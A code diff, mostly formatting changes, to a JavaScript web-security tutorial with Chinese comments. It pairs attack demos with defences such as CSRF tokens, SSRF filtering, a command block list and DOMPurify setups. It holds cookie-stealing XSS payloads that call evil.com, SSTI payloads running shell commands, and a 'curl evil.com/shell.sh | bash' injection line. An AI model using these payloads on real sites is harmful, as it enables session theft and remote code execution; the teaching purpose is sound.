@@ -35,7 +35,7 @@ const config = window.config || {};
 // 在浏览器中，window.config 被 HTML 元素覆盖！
 // config 现在是 HTMLFormElement，不是 {}
 
-fetch(config.apiUrl + '/data');
+fetch(config.apiUrl + "/data");
 // 实际请求: https://evil.com/hook/data
 
 // --- 防御：对象冻结 + 严格初始化 ---
@@ -55,13 +55,15 @@ class DOMClobberingDefense {
    */
   protectGlobal(name, value) {
     if (name in window) {
-      throw new Error(`[Security] Global "${name}" already exists — possible clobbering`);
+      throw new Error(
+        `[Security] Global "${name}" already exists — possible clobbering`,
+      );
     }
     Object.defineProperty(window, name, {
       value: value,
       writable: false,
       configurable: false,
-      enumerable: true
+      enumerable: true,
     });
     this.protectedGlobals.add(name);
   }
@@ -90,13 +92,13 @@ class DOMClobberingDefense {
 
 // 使用示例：在 <head> 最顶部
 const defense = new DOMClobberingDefense();
-defense.protectGlobal('config', {
-  apiUrl: 'https://api.myapp.com',
-  timeout: 5000
+defense.protectGlobal("config", {
+  apiUrl: "https://api.myapp.com",
+  timeout: 5000,
 });
 
 // 检测
-if (defense.detectClobbering('config')) {
+if (defense.detectClobbering("config")) {
   // 触发安全响应：刷新页面 + 上报
   location.reload();
 }
@@ -123,10 +125,11 @@ class MutationXSSDemo {
     const observer = new MutationObserver((mutations) => {
       for (const mutation of mutations) {
         for (const node of mutation.addedNodes) {
-          if (node.nodeType === 1 && node.classList?.contains('user-content')) {
+          if (node.nodeType === 1 && node.classList?.contains("user-content")) {
             // 在用户内容渲染后立即注入
-            const script = document.createElement('script');
-            script.textContent = 'fetch("https://evil.com?cookie=" + document.cookie)';
+            const script = document.createElement("script");
+            script.textContent =
+              'fetch("https://evil.com?cookie=" + document.cookie)';
             node.appendChild(script);
           }
         }
@@ -135,7 +138,7 @@ class MutationXSSDemo {
 
     observer.observe(document.body, {
       childList: true,
-      subtree: true
+      subtree: true,
     });
 
     return observer;
@@ -149,8 +152,8 @@ class MutationXSSDemo {
     // Content-Security-Policy: script-src 'self';
 
     // 2. 使用 Shadow DOM 隔离用户内容
-    const container = document.createElement('div');
-    const shadow = container.attachShadow({ mode: 'closed' });
+    const container = document.createElement("div");
+    const shadow = container.attachShadow({ mode: "closed" });
     shadow.innerHTML = '<div class="user-content"></div>';
 
     // Shadow DOM 内的脚本无法访问外部 document
@@ -158,10 +161,12 @@ class MutationXSSDemo {
 
     // 3. 使用 Trusted Types 强制类型安全
     if (window.trustedTypes) {
-      const policy = trustedTypes.createPolicy('sanitizer', {
-        createHTML: (string) => DOMPurify.sanitize(string, { RETURN_TRUSTED_TYPE: true })
+      const policy = trustedTypes.createPolicy("sanitizer", {
+        createHTML: (string) =>
+          DOMPurify.sanitize(string, { RETURN_TRUSTED_TYPE: true }),
       });
-      shadow.querySelector('.user-content').innerHTML = policy.createHTML(userInput);
+      shadow.querySelector(".user-content").innerHTML =
+        policy.createHTML(userInput);
     }
 
     return container;
@@ -202,7 +207,9 @@ class ScriptGadgetDemo {
     // </script>
     // <script src="https://cdn.example.com/analytics.js"></script>
 
-    console.warn('[Security] Script gadget attack: third-party script hijacked via config');
+    console.warn(
+      "[Security] Script gadget attack: third-party script hijacked via config",
+    );
   }
 
   /**
@@ -234,10 +241,10 @@ class ScriptGadgetDemo {
    */
   static generateSRI(filePath) {
     // Node.js 环境生成 SRI hash
-    const crypto = require('crypto');
-    const fs = require('fs');
+    const crypto = require("crypto");
+    const fs = require("fs");
     const content = fs.readFileSync(filePath);
-    const hash = crypto.createHash('sha384').update(content).digest('base64');
+    const hash = crypto.createHash("sha384").update(content).digest("base64");
     return `sha384-${hash}`;
   }
 }
@@ -261,14 +268,15 @@ class BlindXSSDemo {
    */
   static attackViaLogging() {
     // 攻击者在输入中注入：
-    const maliciousInput = '<img src=x onerror="fetch(\'https://evil.com/?\'+document.cookie)">';
+    const maliciousInput =
+      "<img src=x onerror=\"fetch('https://evil.com/?'+document.cookie)\">";
 
     // 应用将用户输入写入日志（未转义）：
     // admin 在后台查看日志时，日志页面直接渲染了 HTML
     // → 脚本在管理员浏览器中执行
     // → 攻击者获得管理员 cookie/session
 
-    console.warn('[Security] Blind XSS via logging system');
+    console.warn("[Security] Blind XSS via logging system");
   }
 
   /**
@@ -280,7 +288,7 @@ class BlindXSSDemo {
 
     // 如果后台日志直接渲染 User-Agent 字段 → Blind XSS
 
-    console.warn('[Security] Blind XSS via User-Agent header');
+    console.warn("[Security] Blind XSS via User-Agent header");
   }
 
   /**
@@ -292,7 +300,6 @@ class BlindXSSDemo {
     // 3. 输入净化：所有用户输入在进入系统前净化
     // 4. CSP: 即使注入成功也无法执行脚本
     // Content-Security-Policy: default-src 'self'; script-src 'self';
-
     // 5. 敏感操作二次验证：管理员操作需要二次确认
   }
 }
@@ -340,7 +347,7 @@ class SameSiteCSRF {
     //
     // 307 保持原始方法，所以如果重定向目标是 POST → CSRF 成功
 
-    console.warn('[Security] SameSite Lax bypass via 307 redirect');
+    console.warn("[Security] SameSite Lax bypass via 307 redirect");
   }
 
   /**
@@ -349,15 +356,12 @@ class SameSiteCSRF {
   static defense() {
     // 1. Cookie 设置：
     // Set-Cookie: session=xxx; SameSite=Strict; Secure; HttpOnly; Path=/
-
     // 2. 自定义请求头（CORS 预检会阻止跨站）：
     // X-Requested-With: XMLHttpRequest
-
     // 3. 双重 Cookie 验证：
     // - 设置 cookie: XSRF-TOKEN=random-value
     // - 请求时携带: header X-XSRF-TOKEN=random-value
     // - 服务端验证两者一致
-
     // 4. SameSite 不能作为唯一防御，需要组合使用
   }
 }
@@ -385,7 +389,7 @@ class DoubleCookieCSRF {
    * 服务端中间件
    */
   static createCSRFMiddleware(secret) {
-    const crypto = require('crypto');
+    const crypto = require("crypto");
 
     return {
       /**
@@ -393,15 +397,15 @@ class DoubleCookieCSRF {
        */
       generateToken(req, res, next) {
         // 如果已有 token 则复用，否则生成新的
-        let token = req.cookies['XSRF-TOKEN'];
+        let token = req.cookies["XSRF-TOKEN"];
         if (!token) {
-          token = crypto.randomBytes(32).toString('hex');
-          res.cookie('XSRF-TOKEN', token, {
-            httpOnly: false,    // 必须 false，前端需要读取
-            secure: true,       // 仅 HTTPS
-            sameSite: 'strict',
-            maxAge: 3600000,    // 1 小时
-            path: '/'
+          token = crypto.randomBytes(32).toString("hex");
+          res.cookie("XSRF-TOKEN", token, {
+            httpOnly: false, // 必须 false，前端需要读取
+            secure: true, // 仅 HTTPS
+            sameSite: "strict",
+            maxAge: 3600000, // 1 小时
+            path: "/",
           });
         }
         req.csrfToken = token;
@@ -413,28 +417,30 @@ class DoubleCookieCSRF {
        */
       verifyToken(req, res, next) {
         // 只验证非安全方法
-        const safeMethods = ['GET', 'HEAD', 'OPTIONS'];
+        const safeMethods = ["GET", "HEAD", "OPTIONS"];
         if (safeMethods.includes(req.method)) {
           return next();
         }
 
-        const cookieToken = req.cookies['XSRF-TOKEN'];
-        const headerToken = req.headers['x-xsrf-token'];
+        const cookieToken = req.cookies["XSRF-TOKEN"];
+        const headerToken = req.headers["x-xsrf-token"];
 
         if (!cookieToken || !headerToken) {
-          return res.status(403).json({ error: 'CSRF token missing' });
+          return res.status(403).json({ error: "CSRF token missing" });
         }
 
         // 常量时间比较，防止时序攻击
-        if (!crypto.timingSafeEqual(
-          Buffer.from(cookieToken),
-          Buffer.from(headerToken)
-        )) {
-          return res.status(403).json({ error: 'CSRF token mismatch' });
+        if (
+          !crypto.timingSafeEqual(
+            Buffer.from(cookieToken),
+            Buffer.from(headerToken),
+          )
+        ) {
+          return res.status(403).json({ error: "CSRF token mismatch" });
         }
 
         next();
-      }
+      },
     };
   }
 
@@ -445,15 +451,15 @@ class DoubleCookieCSRF {
     return {
       request: (config) => {
         const token = document.cookie
-          .split('; ')
-          .find(row => row.startsWith('XSRF-TOKEN='))
-          ?.split('=')[1];
+          .split("; ")
+          .find((row) => row.startsWith("XSRF-TOKEN="))
+          ?.split("=")[1];
 
         if (token) {
-          config.headers['X-XSRF-TOKEN'] = token;
+          config.headers["X-XSRF-TOKEN"] = token;
         }
         return config;
-      }
+      },
     };
   }
 
@@ -462,13 +468,13 @@ class DoubleCookieCSRF {
    */
   static fetchWrapper(url, options = {}) {
     const token = document.cookie
-      .split('; ')
-      .find(row => row.startsWith('XSRF-TOKEN='))
-      ?.split('=')[1];
+      .split("; ")
+      .find((row) => row.startsWith("XSRF-TOKEN="))
+      ?.split("=")[1];
 
     const headers = {
       ...options.headers,
-      ...(token && { 'X-XSRF-TOKEN': token })
+      ...(token && { "X-XSRF-TOKEN": token }),
     };
 
     return fetch(url, { ...options, headers });
@@ -497,47 +503,53 @@ class CSRFAttackSurface {
       const risk = {
         path: ep.path,
         method: ep.method,
-        riskLevel: 'safe',
+        riskLevel: "safe",
         issues: [],
-        recommendations: []
+        recommendations: [],
       };
 
       // 检查 1: 非安全方法（POST/PUT/DELETE/PATCH）
-      if (!['GET', 'HEAD', 'OPTIONS'].includes(ep.method)) {
-        risk.riskLevel = 'high';
-        risk.issues.push('Non-safe HTTP method');
+      if (!["GET", "HEAD", "OPTIONS"].includes(ep.method)) {
+        risk.riskLevel = "high";
+        risk.issues.push("Non-safe HTTP method");
 
         // 检查 2: 是否有 CSRF 保护
         if (!ep.hasCSRFProtection) {
-          risk.riskLevel = 'critical';
-          risk.issues.push('No CSRF protection');
-          risk.recommendations.push('Add double-cookie token or SameSite cookie');
+          risk.riskLevel = "critical";
+          risk.issues.push("No CSRF protection");
+          risk.recommendations.push(
+            "Add double-cookie token or SameSite cookie",
+          );
         }
 
         // 检查 3: 是否依赖 Cookie 认证
-        if (ep.authType === 'cookie') {
-          risk.issues.push('Cookie-based authentication');
-          risk.recommendations.push('Consider Bearer token for state-changing operations');
+        if (ep.authType === "cookie") {
+          risk.issues.push("Cookie-based authentication");
+          risk.recommendations.push(
+            "Consider Bearer token for state-changing operations",
+          );
         }
 
         // 检查 4: Content-Type 是否为 application/x-www-form-urlencoded
-        if (ep.contentType === 'application/x-www-form-urlencoded') {
-          risk.issues.push('Form-encoded content type — easy to forge');
-          risk.recommendations.push('Require application/json (triggers CORS preflight)');
+        if (ep.contentType === "application/x-www-form-urlencoded") {
+          risk.issues.push("Form-encoded content type — easy to forge");
+          risk.recommendations.push(
+            "Require application/json (triggers CORS preflight)",
+          );
         }
       }
 
       // 检查 5: GET 请求是否有副作用
-      if (ep.method === 'GET' && ep.hasSideEffects) {
-        risk.riskLevel = 'critical';
-        risk.issues.push('GET request with side effects — violates HTTP spec');
-        risk.recommendations.push('Change to POST/PUT/DELETE');
+      if (ep.method === "GET" && ep.hasSideEffects) {
+        risk.riskLevel = "critical";
+        risk.issues.push("GET request with side effects — violates HTTP spec");
+        risk.recommendations.push("Change to POST/PUT/DELETE");
       }
 
       risks.push(risk);
     }
 
-    return risks.filter(r => r.riskLevel !== 'safe');
+    return risks.filter((r) => r.riskLevel !== "safe");
   }
 
   /**
@@ -546,9 +558,9 @@ class CSRFAttackSurface {
   static generateReport(risks) {
     const summary = {
       total: risks.length,
-      critical: risks.filter(r => r.riskLevel === 'critical').length,
-      high: risks.filter(r => r.riskLevel === 'high').length,
-      medium: risks.filter(r => r.riskLevel === 'medium').length
+      critical: risks.filter((r) => r.riskLevel === "critical").length,
+      high: risks.filter((r) => r.riskLevel === "high").length,
+      medium: risks.filter((r) => r.riskLevel === "medium").length,
     };
 
     return { summary, details: risks };
@@ -557,9 +569,21 @@ class CSRFAttackSurface {
 
 // 使用示例
 const endpoints = [
-  { path: '/api/transfer', method: 'POST', authType: 'cookie', hasCSRFProtection: false, contentType: 'application/x-www-form-urlencoded' },
-  { path: '/api/user/profile', method: 'PUT', authType: 'cookie', hasCSRFProtection: true, contentType: 'application/json' },
-  { path: '/api/logout', method: 'GET', hasSideEffects: true },
+  {
+    path: "/api/transfer",
+    method: "POST",
+    authType: "cookie",
+    hasCSRFProtection: false,
+    contentType: "application/x-www-form-urlencoded",
+  },
+  {
+    path: "/api/user/profile",
+    method: "PUT",
+    authType: "cookie",
+    hasCSRFProtection: true,
+    contentType: "application/json",
+  },
+  { path: "/api/logout", method: "GET", hasSideEffects: true },
 ];
 
 const risks = CSRFAttackSurface.scanEndpoints(endpoints);
@@ -601,7 +625,7 @@ class SSTIAttackDefense {
     //
     // → 攻击者执行任意服务器命令！
 
-    console.warn('[Security] SSTI via EJS template injection');
+    console.warn("[Security] SSTI via EJS template injection");
   }
 
   /**
@@ -611,7 +635,7 @@ class SSTIAttackDefense {
     // Nunjucks 模板注入载荷：
     // {{ constructor.constructor('return process')().mainModule.require('child_process').execSync('id') }}
 
-    console.warn('[Security] SSTI via Nunjucks template injection');
+    console.warn("[Security] SSTI via Nunjucks template injection");
   }
 
   /**
@@ -624,7 +648,7 @@ class SSTIAttackDefense {
     //
     // 攻击载荷：${require('child_process').execSync('whoami')}
 
-    console.warn('[Security] Template literal injection via eval');
+    console.warn("[Security] Template literal injection via eval");
   }
 
   /**
@@ -636,7 +660,6 @@ class SSTIAttackDefense {
     // 3. 限制模板引擎的访问权限
     // 4. 使用白名单允许的模板
     // 5. 沙箱执行环境
-
     // EJS 安全配置示例：
     // const ejs = require('ejs');
     // const options = {
@@ -676,7 +699,7 @@ class SSRFAttackDefense {
     // → 获取云服务器的 IAM 凭证！
     // → 攻击者可以完全控制云服务器
 
-    console.warn('[Security] SSRF accessing cloud metadata');
+    console.warn("[Security] SSRF accessing cloud metadata");
   }
 
   /**
@@ -690,30 +713,30 @@ class SSRFAttackDefense {
     //
     // → 发现内网服务，进一步攻击
 
-    console.warn('[Security] SSRF internal network scanning');
+    console.warn("[Security] SSRF internal network scanning");
   }
 
   /**
    * 防御：URL 验证 + 网络隔离
    */
   static createSSRFMiddleware() {
-    const dns = require('dns').promises;
-    const net = require('net');
+    const dns = require("dns").promises;
+    const net = require("net");
 
     // 私有 IP 范围
     const PRIVATE_RANGES = [
-      /^10\./,                                    // 10.0.0.0/8
-      /^172\.(1[6-9]|2\d|3[01])\./,              // 172.16.0.0/12
-      /^192\.168\./,                              // 192.168.0.0/16
-      /^127\./,                                   // 127.0.0.0/8
-      /^0\./,                                     // 0.0.0.0/8
-      /^169\.254\./,                              // 169.254.0.0/16 (link-local)
+      /^10\./, // 10.0.0.0/8
+      /^172\.(1[6-9]|2\d|3[01])\./, // 172.16.0.0/12
+      /^192\.168\./, // 192.168.0.0/16
+      /^127\./, // 127.0.0.0/8
+      /^0\./, // 0.0.0.0/8
+      /^169\.254\./, // 169.254.0.0/16 (link-local)
       /^localhost$/i,
-      /^\[/,                                      // IPv6
+      /^\[/, // IPv6
     ];
 
     function isPrivateIP(ip) {
-      return PRIVATE_RANGES.some(range => range.test(ip));
+      return PRIVATE_RANGES.some((range) => range.test(ip));
     }
 
     return async function ssrfMiddleware(req, res, next) {
@@ -724,22 +747,25 @@ class SSRFAttackDefense {
         const parsed = new URL(url);
 
         // 检查 1: 只允许 HTTP/HTTPS
-        if (!['http:', 'https:'].includes(parsed.protocol)) {
-          return res.status(400).json({ error: 'Only HTTP/HTTPS allowed' });
+        if (!["http:", "https:"].includes(parsed.protocol)) {
+          return res.status(400).json({ error: "Only HTTP/HTTPS allowed" });
         }
 
         // 检查 2: 解析 DNS 并检查 IP
         const resolvedIP = await dns.lookup(parsed.hostname);
-        const ip = typeof resolvedIP === 'string' ? resolvedIP : resolvedIP.address;
+        const ip =
+          typeof resolvedIP === "string" ? resolvedIP : resolvedIP.address;
 
         if (isPrivateIP(ip)) {
-          return res.status(403).json({ error: 'Private IP addresses not allowed' });
+          return res
+            .status(403)
+            .json({ error: "Private IP addresses not allowed" });
         }
 
         // 检查 3: 白名单域名
-        const allowedDomains = ['api.example.com', 'cdn.example.com'];
+        const allowedDomains = ["api.example.com", "cdn.example.com"];
         if (!allowedDomains.includes(parsed.hostname)) {
-          return res.status(403).json({ error: 'Domain not in allowlist' });
+          return res.status(403).json({ error: "Domain not in allowlist" });
         }
 
         // 检查 4: 重定向防护 — 获取最终 IP
@@ -749,7 +775,7 @@ class SSRFAttackDefense {
         req.ssrfVerified = true;
         next();
       } catch (err) {
-        return res.status(400).json({ error: 'Invalid URL' });
+        return res.status(400).json({ error: "Invalid URL" });
       }
     };
   }
@@ -784,14 +810,14 @@ class CommandInjection {
     //
     // 或：host=8.8.8.8 && curl https://evil.com/shell.sh | bash
 
-    console.warn('[Security] Command injection via child_process.exec');
+    console.warn("[Security] Command injection via child_process.exec");
   }
 
   /**
    * 防御：使用 spawn/execFile + 输入验证
    */
   static defense() {
-    const { execFile } = require('child_process');
+    const { execFile } = require("child_process");
 
     // 安全写法：
     // app.post('/ping', (req, res) => {
@@ -809,25 +835,34 @@ class CommandInjection {
     //   });
     // });
 
-    console.log('[Security] Safe command execution pattern');
+    console.log("[Security] Safe command execution pattern");
   }
 
   /**
    * 通用安全命令执行工具
    */
   static safeExec(command, args, options = {}) {
-    const { execFile } = require('child_process');
+    const { execFile } = require("child_process");
 
     // 验证：command 不在黑名单中
-    const dangerousCommands = ['rm', 'mkfs', 'dd', 'curl', 'wget', 'bash', 'sh', 'zsh'];
+    const dangerousCommands = [
+      "rm",
+      "mkfs",
+      "dd",
+      "curl",
+      "wget",
+      "bash",
+      "sh",
+      "zsh",
+    ];
     if (dangerousCommands.includes(command)) {
       throw new Error(`Command "${command}" is not allowed`);
     }
 
     // 验证：所有参数只包含安全字符
     for (const arg of args) {
-      if (typeof arg !== 'string') {
-        throw new Error('All arguments must be strings');
+      if (typeof arg !== "string") {
+        throw new Error("All arguments must be strings");
       }
       if (!/^[-a-zA-Z0-9._/ :@%+~=,]+$/.test(arg)) {
         throw new Error(`Argument contains unsafe characters: ${arg}`);
@@ -835,15 +870,20 @@ class CommandInjection {
     }
 
     return new Promise((resolve, reject) => {
-      execFile(command, args, {
-        timeout: options.timeout || 30000,
-        maxBuffer: options.maxBuffer || 1024 * 1024,
-        cwd: options.cwd || process.cwd(),
-        env: options.env || { PATH: '/usr/bin:/bin' } // 最小化环境变量
-      }, (err, stdout, stderr) => {
-        if (err) return reject(err);
-        resolve({ stdout, stderr });
-      });
+      execFile(
+        command,
+        args,
+        {
+          timeout: options.timeout || 30000,
+          maxBuffer: options.maxBuffer || 1024 * 1024,
+          cwd: options.cwd || process.cwd(),
+          env: options.env || { PATH: "/usr/bin:/bin" }, // 最小化环境变量
+        },
+        (err, stdout, stderr) => {
+          if (err) return reject(err);
+          resolve({ stdout, stderr });
+        },
+      );
     });
   }
 }
@@ -872,20 +912,31 @@ class DOMPurifyAdvanced {
     // 允许基本的格式化标签
     const clean = DOMPurify.sanitize(dirty, {
       ALLOWED_TAGS: [
-        'b', 'i', 'em', 'strong', 'a', 'p', 'br', 'ul', 'ol', 'li',
-        'code', 'pre', 'blockquote'
+        "b",
+        "i",
+        "em",
+        "strong",
+        "a",
+        "p",
+        "br",
+        "ul",
+        "ol",
+        "li",
+        "code",
+        "pre",
+        "blockquote",
       ],
-      ALLOWED_ATTR: ['href', 'title'],
-      ALLOWED_URI_PROTOCOLS: ['http', 'https', 'mailto'],
+      ALLOWED_ATTR: ["href", "title"],
+      ALLOWED_URI_PROTOCOLS: ["http", "https", "mailto"],
       // 禁止 javascript: 协议
-      FORBID_PROTOCOLS: ['javascript'],
+      FORBID_PROTOCOLS: ["javascript"],
       // 链接添加 rel 属性
-      ADD_ATTR: ['rel'],
+      ADD_ATTR: ["rel"],
       ADD_TAGS: [],
       // 保留换行
       KEEP_CONTENT: true,
       // 返回 TrustedHTML（如果浏览器支持）
-      RETURN_TRUSTED_TYPE: typeof trustedTypes !== 'undefined'
+      RETURN_TRUSTED_TYPE: typeof trustedTypes !== "undefined",
     });
 
     return clean;
@@ -897,33 +948,78 @@ class DOMPurifyAdvanced {
   static sanitizeBlogPost(dirty) {
     return DOMPurify.sanitize(dirty, {
       ALLOWED_TAGS: [
-        'h1', 'h2', 'h3', 'h4', 'h5', 'h6',
-        'p', 'br', 'hr', 'div', 'span',
-        'b', 'i', 'em', 'strong', 'u', 's', 'strike',
-        'a', 'img',
-        'ul', 'ol', 'li',
-        'table', 'thead', 'tbody', 'tr', 'th', 'td',
-        'blockquote', 'pre', 'code',
-        'details', 'summary',
-        'section', 'article', 'nav'
+        "h1",
+        "h2",
+        "h3",
+        "h4",
+        "h5",
+        "h6",
+        "p",
+        "br",
+        "hr",
+        "div",
+        "span",
+        "b",
+        "i",
+        "em",
+        "strong",
+        "u",
+        "s",
+        "strike",
+        "a",
+        "img",
+        "ul",
+        "ol",
+        "li",
+        "table",
+        "thead",
+        "tbody",
+        "tr",
+        "th",
+        "td",
+        "blockquote",
+        "pre",
+        "code",
+        "details",
+        "summary",
+        "section",
+        "article",
+        "nav",
       ],
       ALLOWED_ATTR: [
-        'href', 'title', 'alt', 'src', 'width', 'height',
-        'class', 'id', 'style',
-        'colspan', 'rowspan',
-        'target', 'rel'
+        "href",
+        "title",
+        "alt",
+        "src",
+        "width",
+        "height",
+        "class",
+        "id",
+        "style",
+        "colspan",
+        "rowspan",
+        "target",
+        "rel",
       ],
-      ALLOWED_URI_PROTOCOLS: ['http', 'https', 'mailto', 'tel'],
-      FORBID_TAGS: ['script', 'object', 'embed', 'form', 'input', 'textarea', 'select'],
-      FORBID_ATTR: ['onerror', 'onload', 'onclick', 'onmouseover', 'onfocus'],
-      ADD_ATTR: ['target', 'rel'],
+      ALLOWED_URI_PROTOCOLS: ["http", "https", "mailto", "tel"],
+      FORBID_TAGS: [
+        "script",
+        "object",
+        "embed",
+        "form",
+        "input",
+        "textarea",
+        "select",
+      ],
+      FORBID_ATTR: ["onerror", "onload", "onclick", "onmouseover", "onfocus"],
+      ADD_ATTR: ["target", "rel"],
       ADD_URI_PROTOCOLS: [],
       WHOLE_DOCUMENT: false,
       SANITIZE_DOM: true,
       KEEP_CONTENT: true,
       RETURN_DOM: false,
       RETURN_DOM_FRAGMENT: false,
-      RETURN_TRUSTED_TYPE: false
+      RETURN_TRUSTED_TYPE: false,
     });
   }
 
@@ -931,19 +1027,19 @@ class DOMPurifyAdvanced {
    * 自定义钩子 — 自动为链接添加安全属性
    */
   static addLinkSafetyHook() {
-    DOMPurify.addHook('afterSanitizeAttributes', (node) => {
+    DOMPurify.addHook("afterSanitizeAttributes", (node) => {
       // 为所有链接添加 target="_blank" 和 rel="noopener noreferrer"
-      if (node.tagName === 'A' && node.hasAttribute('href')) {
-        node.setAttribute('target', '_blank');
-        node.setAttribute('rel', 'noopener noreferrer');
+      if (node.tagName === "A" && node.hasAttribute("href")) {
+        node.setAttribute("target", "_blank");
+        node.setAttribute("rel", "noopener noreferrer");
       }
 
       // 为所有图片添加 referrerpolicy
-      if (node.tagName === 'IMG') {
-        node.setAttribute('referrerpolicy', 'no-referrer');
+      if (node.tagName === "IMG") {
+        node.setAttribute("referrerpolicy", "no-referrer");
         // 限制图片尺寸
-        if (!node.hasAttribute('width')) node.setAttribute('width', '100%');
-        if (!node.hasAttribute('height')) node.setAttribute('height', 'auto');
+        if (!node.hasAttribute("width")) node.setAttribute("width", "100%");
+        if (!node.hasAttribute("height")) node.setAttribute("height", "auto");
       }
     });
   }
@@ -954,28 +1050,29 @@ class DOMPurifyAdvanced {
   static addSuspiciousContentHook() {
     const suspiciousContents = [];
 
-    DOMPurify.addHook('uponSanitizeElement', (node, data) => {
+    DOMPurify.addHook("uponSanitizeElement", (node, data) => {
       // 检测潜在的 phishing 链接
-      if (node.tagName === 'A') {
-        const href = node.getAttribute('href');
-        if (href && (href.includes('login') || href.includes('verify'))) {
+      if (node.tagName === "A") {
+        const href = node.getAttribute("href");
+        if (href && (href.includes("login") || href.includes("verify"))) {
           suspiciousContents.push({
-            type: 'potential-phishing',
-            element: 'a',
+            type: "potential-phishing",
+            element: "a",
             href: href,
-            text: node.textContent
+            text: node.textContent,
           });
         }
       }
 
       // 检测大图片（可能的 DoS）
-      if (node.tagName === 'IMG') {
-        const width = parseInt(node.getAttribute('width') || '0');
-        const height = parseInt(node.getAttribute('height') || '0');
+      if (node.tagName === "IMG") {
+        const width = parseInt(node.getAttribute("width") || "0");
+        const height = parseInt(node.getAttribute("height") || "0");
         if (width > 10000 || height > 10000) {
           suspiciousContents.push({
-            type: 'oversized-image',
-            width, height
+            type: "oversized-image",
+            width,
+            height,
           });
         }
       }
@@ -988,12 +1085,13 @@ class DOMPurifyAdvanced {
    * Trusted Types 集成
    */
   static createTrustedTypesPolicy() {
-    if (typeof trustedTypes === 'undefined') {
+    if (typeof trustedTypes === "undefined") {
       return null;
     }
 
-    return trustedTypes.createPolicy('dompurify', {
-      createHTML: (string) => DOMPurify.sanitize(string, { RETURN_TRUSTED_TYPE: true }),
+    return trustedTypes.createPolicy("dompurify", {
+      createHTML: (string) =>
+        DOMPurify.sanitize(string, { RETURN_TRUSTED_TYPE: true }),
       createScriptURL: (string) => {
         // 只允许同域脚本
         try {
@@ -1001,9 +1099,11 @@ class DOMPurifyAdvanced {
           if (url.origin === window.location.origin) {
             return string;
           }
-        } catch (e) { /* invalid URL */ }
-        throw new TypeError('Invalid script URL');
-      }
+        } catch (e) {
+          /* invalid URL */
+        }
+        throw new TypeError("Invalid script URL");
+      },
     });
   }
 }
@@ -1054,7 +1154,7 @@ class MultiLayerSanitization {
     return {
       valid: errors.length === 0,
       errors,
-      value: errors.length === 0 ? value : null
+      value: errors.length === 0 ? value : null,
     };
   }
 
@@ -1064,44 +1164,67 @@ class MultiLayerSanitization {
    */
   static escapeForContext(value, context) {
     const htmlEntities = {
-      '&': '&amp;', '<': '&lt;', '>': '&gt;',
-      '"': '&quot;', "'": '&#x27;', '/': '&#x2F;', '`': '&#96;'
+      "&": "&amp;",
+      "<": "&lt;",
+      ">": "&gt;",
+      '"': "&quot;",
+      "'": "&#x27;",
+      "/": "&#x2F;",
+      "`": "&#96;",
     };
 
     const jsEntities = {
-      '\\': '\\\\', "'": "\\'", '"': '\\"',
-      '\n': '\\n', '\r': '\\r', '\t': '\\t',
-      '</': '<\\/', '-->': '--\\>'
+      "\\": "\\\\",
+      "'": "\\'",
+      '"': '\\"',
+      "\n": "\\n",
+      "\r": "\\r",
+      "\t": "\\t",
+      "</": "<\\/",
+      "-->": "--\\>",
     };
 
     const cssEntities = {
-      '"': '\\"', '\'': '\\\'',
-      '\\': '\\\\', '/': '\\/',
-      '<': '\\3C', '>': '\\3E',
-      '&': '\\26', ';': '\\3B'
+      '"': '\\"',
+      "'": "\\'",
+      "\\": "\\\\",
+      "/": "\\/",
+      "<": "\\3C",
+      ">": "\\3E",
+      "&": "\\26",
+      ";": "\\3B",
     };
 
     const urlEntities = {
-      '&': '%26', '+': '%2B', ' ': '%20',
-      '#': '%23', '%': '%25', '?': '%3F',
-      '=': '%3D', '<': '%3C', '>': '%3E'
+      "&": "%26",
+      "+": "%2B",
+      " ": "%20",
+      "#": "%23",
+      "%": "%25",
+      "?": "%3F",
+      "=": "%3D",
+      "<": "%3C",
+      ">": "%3E",
     };
 
     switch (context) {
-      case 'html':
-        return String(value).replace(/[&<>"'`/]/g, c => htmlEntities[c]);
+      case "html":
+        return String(value).replace(/[&<>"'`/]/g, (c) => htmlEntities[c]);
 
-      case 'javascript':
-        return String(value).replace(/[\\'"\/\n\r\t<\-]/g, c => jsEntities[c]);
+      case "javascript":
+        return String(value).replace(
+          /[\\'"\/\n\r\t<\-]/g,
+          (c) => jsEntities[c],
+        );
 
-      case 'css':
-        return String(value).replace(/["'\\\/<>&;]/g, c => cssEntities[c]);
+      case "css":
+        return String(value).replace(/["'\\\/<>&;]/g, (c) => cssEntities[c]);
 
-      case 'url':
+      case "url":
         return encodeURIComponent(String(value));
 
-      case 'attribute':
-        return String(value).replace(/[&<>"'`]/g, c => htmlEntities[c]);
+      case "attribute":
+        return String(value).replace(/[&<>"'`]/g, (c) => htmlEntities[c]);
 
       default:
         return String(value);
@@ -1113,11 +1236,11 @@ class MultiLayerSanitization {
    * 对富文本使用 DOMPurify
    */
   static sanitizeHTML(dirty) {
-    if (typeof DOMPurify !== 'undefined') {
+    if (typeof DOMPurify !== "undefined") {
       return DOMPurify.sanitize(dirty);
     }
     // 降级方案：基础 HTML 转义
-    return this.escapeForContext(dirty, 'html');
+    return this.escapeForContext(dirty, "html");
   }
 
   /**
@@ -1126,15 +1249,15 @@ class MultiLayerSanitization {
    */
   static encodeOutput(value, contentType) {
     switch (contentType) {
-      case 'application/json':
+      case "application/json":
         // JSON.stringify 自动处理转义
         return JSON.stringify(value);
 
-      case 'text/html':
-        return this.escapeForContext(value, 'html');
+      case "text/html":
+        return this.escapeForContext(value, "html");
 
-      case 'application/javascript':
-        return this.escapeForContext(value, 'javascript');
+      case "application/javascript":
+        return this.escapeForContext(value, "javascript");
 
       default:
         return String(value);
@@ -1148,10 +1271,10 @@ class MultiLayerSanitization {
     const {
       validate = true,
       schema = null,
-      context = 'html',
+      context = "html",
       sanitizeHTML = false,
       encodeOutput = true,
-      contentType = 'text/html'
+      contentType = "text/html",
     } = options;
 
     let result = value;
@@ -1185,20 +1308,24 @@ class MultiLayerSanitization {
 }
 
 // 使用示例
-const userInput = '<script>alert(1)</script>';
+const userInput = "<script>alert(1)</script>";
 
 // HTML 上下文
-console.log(MultiLayerSanitization.sanitizePipeline(userInput, {
-  context: 'html',
-  contentType: 'text/html'
-}));
+console.log(
+  MultiLayerSanitization.sanitizePipeline(userInput, {
+    context: "html",
+    contentType: "text/html",
+  }),
+);
 // → &lt;script&gt;alert(1)&lt;/script&gt;
 
 // JSON 上下文
-console.log(MultiLayerSanitization.sanitizePipeline(userInput, {
-  context: 'javascript',
-  contentType: 'application/json'
-}));
+console.log(
+  MultiLayerSanitization.sanitizePipeline(userInput, {
+    context: "javascript",
+    contentType: "application/json",
+  }),
+);
 // → JSON 安全转义
